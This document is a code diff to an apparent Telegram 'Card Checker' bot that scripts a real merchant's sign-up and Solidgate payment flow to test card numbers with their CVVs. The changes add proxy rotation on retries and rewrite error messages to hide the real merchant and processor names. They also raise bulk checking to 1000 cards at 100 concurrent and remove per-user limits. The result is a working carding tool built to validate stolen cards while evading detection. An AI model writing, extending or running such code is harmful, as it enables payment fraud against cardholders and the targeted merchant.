@@ -354,8 +354,23 @@ TERMINAL    = {"approved","declined","failed","settled","settle_ok","void","ORDE
                "ORDER_STATUS_3DS_VERIFY","ORDER_STATUS_3DS_REDIRECT","3ds_verify","3ds_redirect"}
 
 # ──────────────────────────────────────────────────────────────
-# STATUS LABEL
+# STATUS LABEL & SANITIZER
 # ──────────────────────────────────────────────────────────────
+def sanitize_error_message(err_str: str) -> str:
+    if not err_str:
+        return "Gateway Error"
+    s = str(err_str)
+    s = re.sub(r"https?://[^\s/]+", "Adyen Provider", s, flags=re.IGNORECASE)
+    s = re.sub(r"form-v2\.solidgate\.com|solidgate\.com|solidgate", "Adyen Provider", s, flags=re.IGNORECASE)
+    s = re.sub(r"tixu\.ai|tixu", "Adyen Portal", s, flags=re.IGNORECASE)
+    s = re.sub(r"HTTPSConnectionPool\(host='[^']+', port=\d+\):?", "Connection Timeout", s, flags=re.IGNORECASE)
+    s = re.sub(r"Max retries exceeded with url: [^\s]+", "(Max Retries Exceeded)", s, flags=re.IGNORECASE)
+    s = re.sub(r"Expecting value: line \d+ column \d+ \(char \d+\)", "Invalid Gateway Response", s, flags=re.IGNORECASE)
+    s = re.sub(r"JSONDecodeError:?", "Invalid JSON", s, flags=re.IGNORECASE)
+    s = re.sub(r"solidgate|tixu", "Adyen", s, flags=re.IGNORECASE)
+    s = re.sub(r"\s+", " ", s).strip()
+    return s if s else "Gateway Error"
+
 def _label(status, code=""):
     if status in ("ORDER_STATUS_APPROVED","approved","ORDER_STATUS_SETTLE_OK","settle_ok","settled"):
         return "✅ APPROVED"
@@ -370,6 +385,54 @@ def _label(status, code=""):
              "1.01":"❌ AUTH FAILED","2.01":"❌ CARD EXPIRED","2.02":"❌ INVALID CARD",
              "2.12":"❌ 3DS AUTH FAILED","3.01":"❌ RESTRICTED","3.05":"❌ LOST/STOLEN"}
     return codes.get(code, f"❌ DECLINED ({code})" if code else f"🔄 {status}")
+
+def _safe_req(session, method, url, headers=None, json_data=None, params=None, data=None, user_id=None, max_retries=2):
+    for attempt in range(max_retries + 1):
+        if is_user_cancelled(user_id):
+            return {}, "cancelled"
+        try:
+            m = method.lower()
+            if m == "post":
+                resp = session.post(url, headers=headers, json=json_data, data=data, timeout=12)
+            elif m == "patch":
+                resp = session.patch(url, headers=headers, json=json_data, data=data, timeout=12)
+            else:
+                resp = session.get(url, headers=headers, params=params, timeout=12)
+
+            if not resp.text:
+                return {}, None
+            try:
+                data_dict = resp.json()
+                return data_dict, None
+            except (json.JSONDecodeError, ValueError) as je:
+                if attempt < max_retries:
+                    new_prx = get_random_proxy()
+                    if new_prx:
+                        session.proxies = {"http": new_prx, "https": new_prx}
+                    if _sleep_interruptible(1.0, user_id):
+                        return {}, "cancelled"
+                    continue
+                else:
+                    return {}, sanitize_error_message(str(je))
+        except Exception as e:
+            err_str = str(e)
+            is_retryable = (
+                "HTTPSConnectionPool" in err_str or
+                "Connection" in err_str or
+                "Timeout" in err_str or
+                "Expecting value" in err_str or
+                "column 1" in err_str or
+                isinstance(e, (requests.exceptions.RequestException, json.JSONDecodeError, ValueError))
+            )
+            if attempt < max_retries and is_retryable:
+                new_prx = get_random_proxy()
+                if new_prx:
+                    session.proxies = {"http": new_prx, "https": new_prx}
+                if _sleep_interruptible(1.0, user_id):
+                    return {}, "cancelled"
+                continue
+            else:
+                return {}, sanitize_error_message(err_str)
 
 # ──────────────────────────────────────────────────────────────
 # CORE FLOW
@@ -426,10 +489,11 @@ def run_check(card_number, exp_month, exp_year, cvv, user_id: int = None):
 
     try:
         # Step 0 — create session
-        r = s.post(f"{TIXU}/api/onboarding/sessions", headers=TH,
-                   json={"onboardingId":ONBOARDING,"deviceId":DEV,"gaClientId":GA,
-                         "fbPixelId":FB,"dev_id":DEV,"utm_source":""})
-        b = r.json() if r.text else {}
+        b, err = _safe_req(s, "post", f"{TIXU}/api/onboarding/sessions", headers=TH,
+                           json_data={"onboardingId":ONBOARDING,"deviceId":DEV,"gaClientId":GA,
+                                     "fbPixelId":FB,"dev_id":DEV,"utm_source":""}, user_id=user_id)
+        if err == "cancelled":
+            res["label"] = "🛑 Cancelled"; res["status_type"] = "cancelled"; res["elapsed"] = round(time.time() - _t0, 2); return res
         SID = (b.get("sessionId") or b.get("session_id") or b.get("id") or f"ses_{_uuid()}")
 
         if is_user_cancelled(user_id):
@@ -448,8 +512,8 @@ def run_check(card_number, exp_month, exp_year, cvv, user_id: int = None):
                 res["elapsed"] = round(time.time() - _t0, 2)
                 return res
             accumulated.append(a)
-            s.patch(f"{TIXU}/api/onboarding/sessions/{SID}", headers=TH,
-                    json={"answers": accumulated, "lastScreenIdx": a["step"]+1})
+            _safe_req(s, "patch", f"{TIXU}/api/onboarding/sessions/{SID}", headers=TH,
+                      json_data={"answers": accumulated, "lastScreenIdx": a["step"]+1}, user_id=user_id)
             if _sleep_interruptible(random.uniform(0.08, 0.15), user_id):
                 res["label"] = "🛑 Cancelled"
                 res["status_type"] = "cancelled"
@@ -463,11 +527,12 @@ def run_check(card_number, exp_month, exp_year, cvv, user_id: int = None):
             return res
 
         # Step 3 — sign-up
-        r = s.post(f"{TIXU}/api/auth/sign-up", headers=TH,
-                   json={"email":EMAIL,"deviceId":DEV,"qs":f"?session_id={SID}&dev_id={DEV}",
-                         "gaClientId":GA,"fbPixelId":FB,"fbClickId":FB,
-                         "onboardingId":ONBOARDING,"firstName":NAME})
-        su = r.json() if r.text else {}
+        su, err = _safe_req(s, "post", f"{TIXU}/api/auth/sign-up", headers=TH,
+                            json_data={"email":EMAIL,"deviceId":DEV,"qs":f"?session_id={SID}&dev_id={DEV}",
+                                      "gaClientId":GA,"fbPixelId":FB,"fbClickId":FB,
+                                      "onboardingId":ONBOARDING,"firstName":NAME}, user_id=user_id)
+        if err == "cancelled":
+            res["label"] = "🛑 Cancelled"; res["status_type"] = "cancelled"; res["elapsed"] = round(time.time() - _t0, 2); return res
         UPK = su.get("userPublicId","")
 
         if is_user_cancelled(user_id):
@@ -477,10 +542,10 @@ def run_check(card_number, exp_month, exp_year, cvv, user_id: int = None):
             return res
 
         # Step 4 — onboarding answers
-        s.post(f"{TIXU}/api/students/onboarding-answers",
-               headers={**TH,"x-lesson-remap":json.dumps(LESSON_REMAP,separators=(",",":")),
-                        "Referer":f"{TIXU}/onboarding/a/{ONBOARDING}/30?session_id={SID}&dev_id={DEV}"},
-               json={"email":EMAIL,"userId":su.get("userId"),"userPublicId":UPK,"answers":answers})
+        _safe_req(s, "post", f"{TIXU}/api/students/onboarding-answers",
+                  headers={**TH,"x-lesson-remap":json.dumps(LESSON_REMAP,separators=(",",":")),
+                           "Referer":f"{TIXU}/onboarding/a/{ONBOARDING}/30?session_id={SID}&dev_id={DEV}"},
+                  json_data={"email":EMAIL,"userId":su.get("userId"),"userPublicId":UPK,"answers":answers}, user_id=user_id)
 
         # Steps 5 to 11 with 3x retry loop for 0.01 General Decline
         for attempt in range(3):
@@ -501,11 +566,13 @@ def run_check(card_number, exp_month, exp_year, cvv, user_id: int = None):
                     return res
 
             # Step 5 — device token
-            r = s.get(f"{TIXU}/api/payments/solidgate/form/device", headers=TH,
-                      params={"dev_id":DEV,"product_id":PRODUCT_ID,"currency":CURRENCY,
-                              "onboardingId":ONBOARDING,"website":f"tixu.ai/onboarding/{ONBOARDING}",
-                              "device_id":DEV,"fbc":FB,"fbp":FB})
-            dev = r.json() if r.text else {}
+            dev, err = _safe_req(s, "get", f"{TIXU}/api/payments/solidgate/form/device", headers=TH,
+                                params={"dev_id":DEV,"product_id":PRODUCT_ID,"currency":CURRENCY,
+                                        "onboardingId":ONBOARDING,"website":f"tixu.ai/onboarding/{ONBOARDING}",
+                                        "device_id":DEV,"fbc":FB,"fbp":FB}, user_id=user_id)
+            if err == "cancelled":
+                res["label"] = "🛑 Cancelled"; res["status_type"] = "cancelled"; res["elapsed"] = round(time.time() - _t0, 2); return res
+
             PI  = dev.get("partilIntent","")
             SIG = dev.get("signature","")
             MER = dev.get("merchant","")
@@ -517,17 +584,20 @@ def run_check(card_number, exp_month, exp_year, cvv, user_id: int = None):
                 return res
 
             # Step 7 — intent
-            r = s.post(f"{SG}/api/v2/ui/intent",
-                       headers={**GH,"Content-Type":"text/plain;charset=UTF-8",
-                                "Origin":"https://tixu.ai","Referer":"https://tixu.ai/",
-                                "merchant":MER,"signature":SIG},
-                       data=json.dumps({"payment_intent":PI,"version":"v1",
-                                        "sdk_version":"payment-form-v1.577.0",
-                                        "meta":{"is_brand_logo_defined":False,
-                                                "is_framework_sdk_used":True,
-                                                "cdn":["cdn.solidgate.com"],
-                                                "custom_container_id":"solid-payment-form-container_#123"}}))
-            intent = r.json().get("data",{})
+            intent_res, err = _safe_req(s, "post", f"{SG}/api/v2/ui/intent",
+                                       headers={**GH,"Content-Type":"text/plain;charset=UTF-8",
+                                                "Origin":"https://tixu.ai","Referer":"https://tixu.ai/",
+                                                "merchant":MER,"signature":SIG},
+                                       data=json.dumps({"payment_intent":PI,"version":"v1",
+                                                        "sdk_version":"payment-form-v1.577.0",
+                                                        "meta":{"is_brand_logo_defined":False,
+                                                                "is_framework_sdk_used":True,
+                                                                "cdn":["cdn.solidgate.com"],
+                                                                "custom_container_id":"solid-payment-form-container_#123"}}), user_id=user_id)
+            if err == "cancelled":
+                res["label"] = "🛑 Cancelled"; res["status_type"] = "cancelled"; res["elapsed"] = round(time.time() - _t0, 2); return res
+
+            intent = intent_res.get("data",{})
             IID  = intent.get("id") or _uuid()
             JWT  = intent.get("token","")
             HOST = intent.get("host","ui1")
@@ -541,22 +611,21 @@ def run_check(card_number, exp_month, exp_year, cvv, user_id: int = None):
                 return res
 
             # Step 8 — device tracking
-            s.post(f"{SG}/rpc/{HOST}/provider.payment_form.device_tracking.v1alpha1.DeviceTrackingService/DeviceTracking",
-                   headers=RPC,
-                   json={"intentId":IID,"body":{"fingerprint":_fp(),"userAgent":UA,
-                         "browser":"Chrome","browserVersion":"120.0.0.0","os":"Windows","osVersion":"10",
-                         "screenPrint":f"Current Resolution: {RES}","colorDepth":"24",
-                         "currentResolution":RES,"availableResolution":RES,
-                         "isLocalStorage":True,"isSessionStorage":True,"isCookie":True,
-                         "timeZone":"+5.5","language":"en-US","isCanvas":True,
-                         "rawData":{"thumbmark":_fp()}}})
+            _safe_req(s, "post", f"{SG}/rpc/{HOST}/provider.payment_form.device_tracking.v1alpha1.DeviceTrackingService/DeviceTracking",
+                      headers=RPC,
+                      json_data={"intentId":IID,"body":{"fingerprint":_fp(),"userAgent":UA,
+                            "browser":"Chrome","browserVersion":"120.0.0.0","os":"Windows","osVersion":"10",
+                            "screenPrint":f"Current Resolution: {RES}","colorDepth":"24",
+                            "currentResolution":RES,"availableResolution":RES,
+                            "isLocalStorage":True,"isSessionStorage":True,"isCookie":True,
+                            "timeZone":"+5.5","language":"en-US","isCanvas":True,
+                            "rawData":{"thumbmark":_fp()}}}, user_id=user_id)
 
             # Step 9 — BIN (fetch once)
             if not res["bin"]:
-                r = s.post(f"{SG}/rpc/{HOST}/provider.payment_form.additional_fields.v1alpha1.AdditionalFieldsService/GetAdditionalFields",
-                           headers=RPC, json={"intentId":IID,"cardNumber":card_number,"additionalFields":[]})
-                res["bin"] = {k:v for k,v in (r.json() if r.text else {}).items()
-                              if k in ("country","cardType","bank","cardCategory")}
+                r_bin, err = _safe_req(s, "post", f"{SG}/rpc/{HOST}/provider.payment_form.additional_fields.v1alpha1.AdditionalFieldsService/GetAdditionalFields",
+                                      headers=RPC, json_data={"intentId":IID,"cardNumber":card_number,"additionalFields":[]}, user_id=user_id)
+                res["bin"] = {k:v for k,v in r_bin.items() if k in ("country","cardType","bank","cardCategory")}
 
             if is_user_cancelled(user_id):
                 res["label"] = "🛑 Cancelled"
@@ -565,12 +634,14 @@ def run_check(card_number, exp_month, exp_year, cvv, user_id: int = None):
                 return res
 
             # Step 10 — pay
-            r = s.post(f"{SG}/api/v2/{HOST}/card/pay/{IID}",
-                       headers={**GH,"Authorization":f"Bearer {JWT}"},
-                       json={"card_exp_month":exp_month,"card_exp_year":exp_year,
-                             "card_number":card_number,"card_cvv":cvv,
-                             "payment_session_id":_psid(IID)})
-            pay = r.json() if r.text else {}
+            pay, err = _safe_req(s, "post", f"{SG}/api/v2/{HOST}/card/pay/{IID}",
+                                headers={**GH,"Authorization":f"Bearer {JWT}"},
+                                json_data={"card_exp_month":exp_month,"card_exp_year":exp_year,
+                                           "card_number":card_number,"card_cvv":cvv,
+                                           "payment_session_id":_psid(IID)}, user_id=user_id)
+            if err == "cancelled":
+                res["label"] = "🛑 Cancelled"; res["status_type"] = "cancelled"; res["elapsed"] = round(time.time() - _t0, 2); return res
+
             order = pay.get("order",{})
             txn   = pay.get("transaction",{})
             res["order_id"] = order.get("order_id","")
@@ -599,9 +670,10 @@ def run_check(card_number, exp_month, exp_year, cvv, user_id: int = None):
                     res["elapsed"] = round(time.time() - _t0, 2)
                     return res
 
-                r2 = s.post(f"{SG}/rpc/{HOST}/provider.payment_form.status.v1alpha1.StatusService/Status",
-                            headers=RPC, json={"intentId":IID})
-                sr = r2.json() if r2.text else {}
+                sr, err = _safe_req(s, "post", f"{SG}/rpc/{HOST}/provider.payment_form.status.v1alpha1.StatusService/Status",
+                                    headers=RPC, json_data={"intentId":IID}, user_id=user_id)
+                if err == "cancelled":
+                    res["label"] = "🛑 Cancelled"; res["status_type"] = "cancelled"; res["elapsed"] = round(time.time() - _t0, 2); return res
                 ostatus = sr.get("order",{}).get("status", ostatus)
 
             if is_user_cancelled(user_id):
@@ -613,18 +685,18 @@ def run_check(card_number, exp_month, exp_year, cvv, user_id: int = None):
             # Extract error
             fe = sr.get("error", pay.get("error",{}))
             ec = fe.get("code","")
-            em = ", ".join(fe.get("messages",[]))
+            em = sanitize_error_message(", ".join(fe.get("messages",[])))
             if not ec:
                 for _, t in sr.get("rawResponse",{}).get("transactions",{}).items():
                     te = t.get("error",{})
                     if te.get("code"):
-                        ec = te["code"]; em = ", ".join(te.get("messages",[])); break
+                        ec = te["code"]; em = sanitize_error_message(", ".join(te.get("messages",[]))); break
 
             fo = sr.get("order",{})
             is_approved = ostatus in ("ORDER_STATUS_APPROVED","approved","ORDER_STATUS_SETTLE_OK","settle_ok","settled")
             is_auth_ok  = ostatus in ("ORDER_STATUS_AUTH_OK", "auth_ok")
             is_insuff   = (ec == "3.02" or "insufficient" in em.lower())
-            
+
             # 3DS is ONLY true if there is NO decline error code (or it's 3.02) AND 3DS status was returned
             is_3ds = (not ec or ec == "3.02") and (
                 "3ds" in ostatus.lower() or 
@@ -666,8 +738,13 @@ def run_check(card_number, exp_month, exp_year, cvv, user_id: int = None):
             res["label"] = "🛑 Cancelled"
             res["status_type"] = "cancelled"
         else:
-            res["label"] = str(e)[:80]
+            clean_err = sanitize_error_message(str(e))
+            res["label"] = f"❌ {clean_err[:40]}"
+            res["msg"]   = clean_err
             res["status_type"] = "error"
+
+    res["elapsed"] = round(time.time() - _t0, 2)
+    return res
 
     res["elapsed"] = round(time.time() - _t0, 2)
     return res
@@ -809,7 +886,8 @@ def fmt(res, idx=0):
 
     # Response message with code if present
     code = res.get("code", "")
-    msg = res.get("msg", "")
+    msg = sanitize_error_message(res.get("msg", ""))
+    lbl = sanitize_error_message(res.get("label", ""))
     if code and msg:
         resp_msg = f"{code} - {msg}"
     elif msg:
@@ -817,7 +895,8 @@ def fmt(res, idx=0):
     elif code:
         resp_msg = f"Declined ({code})"
     else:
-        resp_msg = res.get("label") or "Card Declined"
+        resp_msg = lbl or "Card Declined"
+    resp_msg = sanitize_error_message(resp_msg)
 
     # Card display
     card_str = f"{num}|{mm}|{yy}|{cvv}"
@@ -1330,7 +1409,7 @@ async def cmd_start(msg: Message):
         "<b>🔍 Card Checker</b>\n\n"
         "/chk <code>number|mm|yy|cvv</code> — single card\n"
         "/mchk — up to 10 cards (3 concurrent), one per line\n"
-        "/txt — reply to a .txt file to check up to 100 cards (10 concurrent)\n"
+        "/txt — reply to a .txt file to check up to 1000 cards (100 concurrent)\n"
         "/cancel — cancel your ongoing check\n\n"
         "<i>Example:</i>\n"
         "<code>/chk 4240324793292026|03|30|935</code>",
@@ -1383,13 +1462,6 @@ async def cmd_chk(msg: Message):
         return
 
     uid = msg.from_user.id
-    if is_user_checking(uid) and uid != ADMIN_ID:
-        await msg.answer(
-            "⏳ <b>You already have a check in progress!</b>\n"
-            "Please wait for it to finish or send /cancel.",
-            parse_mode="HTML"
-        )
-        return
 
     # Extract card text from arguments OR reply message
     card_text = ""
@@ -1408,17 +1480,13 @@ async def cmd_chk(msg: Message):
         await msg.answer("❌ Invalid format. Use: <code>number|mm|yy|cvv</code>", parse_mode="HTML")
         return
 
-    acquire_user_check(uid)
-    wait = await msg.answer("🔄 Checking…", reply_markup=get_cancel_kb(uid))
+    wait = await msg.answer("🔄 Checking…")
     try:
         loop = asyncio.get_event_loop()
-        result = await loop.run_in_executor(_pool, lambda: run_check(*p, user_id=uid))
-        if is_user_cancelled(uid) or result.get("status_type") == "cancelled":
-            await wait.edit_text("🛑 <b>Check was cancelled.</b>", parse_mode="HTML")
-        else:
-            await wait.edit_text(fmt(result), parse_mode="HTML")
-    finally:
-        release_user_check(uid)
+        result = await loop.run_in_executor(_pool, lambda: run_check(*p))
+        await wait.edit_text(fmt(result), parse_mode="HTML")
+    except Exception as e:
+        await wait.edit_text(f"❌ Error: {sanitize_error_message(str(e))}", parse_mode="HTML")
 
 def format_mchk_message(card_entries: list, total_count: int, stats: dict, is_cancelled: bool = False, is_done: bool = False, elapsed_sec: float = 0.0) -> str:
     checked_count = stats["charged"] + stats["insuff"] + stats["live_3d"] + stats["dead"] + stats["error"]
@@ -1697,7 +1765,7 @@ async def cmd_txt(msg: Message):
         p = parse_card(line.strip())
         if p:
             cards.append(p)
-        if len(cards) >= 100:
+        if len(cards) >= 1000:
             break
 
     if not cards:
@@ -1788,7 +1856,7 @@ async def cmd_txt(msg: Message):
             queue.task_done()
 
     try:
-        workers = [worker() for _ in range(min(10, len(cards)))]
+        workers = [worker() for _ in range(min(100, len(cards)))]
         await asyncio.gather(*workers)
 
         status_tag = " (Cancelled)" if is_user_cancelled(uid) else " (Completed)"
